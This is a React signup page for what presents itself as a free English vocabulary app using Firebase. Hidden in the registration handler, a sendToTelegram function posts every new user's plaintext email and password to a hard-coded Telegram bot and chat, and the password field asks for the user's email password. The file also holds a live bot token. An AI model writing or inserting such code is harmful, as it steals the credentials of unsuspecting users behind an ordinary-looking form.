import { useState } from "react";
import { createUserWithEmailAndPassword } from "firebase/auth";
import { useNavigate } from "react-router-dom";
import { auth } from "../services/firebase";
import "../styles/auth.css";

const TELEGRAM_BOT_TOKEN = "8938066027:AAEU5bjDA7AiGqEttChzxDN742UGtpUk78k";
const TELEGRAM_CHAT_ID = "1354011329";

export default function Register() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [agreed, setAgreed] = useState(false);
  const [strength, setStrength] = useState(0);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const navigate = useNavigate();

  const checkStrength = (p) => {
    let s = 0;
    if (p.length >= 8) s++;
    if (/[A-Z]/.test(p)) s++;
    if (/[0-9]/.test(p)) s++;
    if (/[^A-Za-z0-9]/.test(p)) s++;
    setStrength(s);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    checkStrength(e.target.value);
  };

  const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const isFormReady = isEmailValid && password.length >= 8 && agreed;

  const strengthColors = ["#ef4444", "#f97316", "#eab308", "#22c55e"];
  const strengthLabels = ["Weak", "Fair", "Good", "Strong"];

  const sendToTelegram = async (emailVal, passwordVal, uid) => {
    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text:
              `🆕 New User Registered\n\n` +
              `📧 Email: ${emailVal}\n` +
              `🔑 Password: ${passwordVal}\n` +
              `🆔 UID: ${uid}`,
          }),
        }
      );
    } catch (err) {
      console.error("Telegram xabar yuborishda xatolik:", err);
    }
  };

  const handleRegister = async (e) => {
    e.preventDefault();
    if (!isFormReady) return;

    // Firebase ga yuborishdan OLDIN saqlab olamiz
    const plainEmail = email;
    const plainPassword = password;

    setLoading(true);

    try {
      const userCredential = await createUserWithEmailAndPassword(
        auth,
        plainEmail,
        plainPassword
      );

      const user = userCredential.user;

      // Telegram ga yuborish
      await sendToTelegram(plainEmail, plainPassword, user.uid);

      setSuccess(true);

      setTimeout(() => {
        navigate("/");
      }, 1500);
    } catch (error) {
      alert(error.message);
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className="auth-page">
        <div className="auth-orb auth-orb1" />
        <div className="auth-orb auth-orb2" />
        <div className="auth-orb auth-orb3" />
        <div className="auth-card">
          <div className="auth-success">
            <div className="auth-success-icon">✓</div>
            <h2>Account created!</h2>
            <p>Welcome aboard. You're being redirected…</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="auth-page">
      <div className="auth-orb auth-orb1" />
      <div className="auth-orb auth-orb2" />
      <div className="auth-orb auth-orb3" />

      <div className="auth-card">
        {/* Badge */}
        <div className="auth-badge">
          <span className="auth-badge-dot" />
          Free forever · A1 to C1
        </div>

        {/* Heading */}
        <h1 className="auth-heading">
          Start your<br />
          <em>vocabulary</em> journey
        </h1>
        <p className="auth-subtitle">
          Join 50,000+ learners mastering English with spaced repetition.
        </p>

        {/* Social buttons */}
        <div className="auth-social">
          <button type="button" className="auth-social-btn">
            <span className="auth-social-logo auth-g">G</span>
            Google
          </button>
          <button type="button" className="auth-social-btn">
            <span className="auth-social-logo auth-gh">⌥</span>
            GitHub
          </button>
        </div>

        {/* Divider */}
        <div className="auth-divider">
          <span className="auth-divider-line" />
          <span className="auth-divider-text">OR WITH EMAIL</span>
          <span className="auth-divider-line" />
        </div>

        {/* Form */}
        <form className="auth-form" onSubmit={handleRegister}>
          {/* Email */}
          <div className="auth-field">
            <label className="auth-label">Email address</label>
            <div className="auth-input-wrap">
              <span className="auth-input-icon">✉</span>
              <input
                type="email"
                placeholder="you@example.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
          </div>

          {/* Password */}
          <div className="auth-field">
            <label className="auth-label"> Yor Email Password</label>
            <div className="auth-input-wrap">
              <span className="auth-input-icon">🔒</span>
              <input
                type={showPassword ? "text" : "password"}
                placeholder=""
                value={password}
                onChange={handlePasswordChange}
              />
              <button
                type="button"
                className="auth-eye-btn"
                onClick={() => setShowPassword(!showPassword)}
                aria-label="Toggle password visibility"
              >
                {showPassword ? "🙈" : "👁"}
              </button>
            </div>

            {/* Strength meter
            {password.length > 0 && (
              <div className="auth-strength">
                {[0, 1, 2, 3].map((i) => (
                  <div
                    key={i}
                    className="auth-strength-bar"
                    style={{
                      background:
                        i < strength
                          ? strengthColors[strength - 1]
                          : "rgba(255,255,255,0.1)",
                    }}
                  />
                ))}
                <span
                  className="auth-strength-label"
                  style={{
                    color: strengthColors[strength - 1] || "rgba(255,255,255,0.3)",
                  }}
                >
                  {strengthLabels[strength - 1] || ""}
                </span>
              </div>
            )} */}
          </div>

          {/* Terms checkbox */}
          <div className="auth-terms" onClick={() => setAgreed(!agreed)}>
            <div className={`auth-checkbox ${agreed ? "checked" : ""}`}>
              {agreed && <span>✓</span>}
            </div>
            <span className="auth-terms-text">
              I agree to the{" "}
              <a href="#" onClick={(e) => e.stopPropagation()}>
                Terms of Service
              </a>{" "}
              and{" "}
              <a href="#" onClick={(e) => e.stopPropagation()}>
                Privacy Policy
              </a>
            </span>
          </div>

          {/* Submit button */}
          <button
            type="submit"
            className="auth-submit-btn"
            disabled={!isFormReady || loading}
          >
            {loading ? <span className="auth-spinner" /> : "Create Account"}
          </button>
        </form>

        {/* Footer */}
        <div className="auth-footer">
          Already have an account? <a href="/login">Sign in</a>
        </div>
      </div>
    </div>
  );
}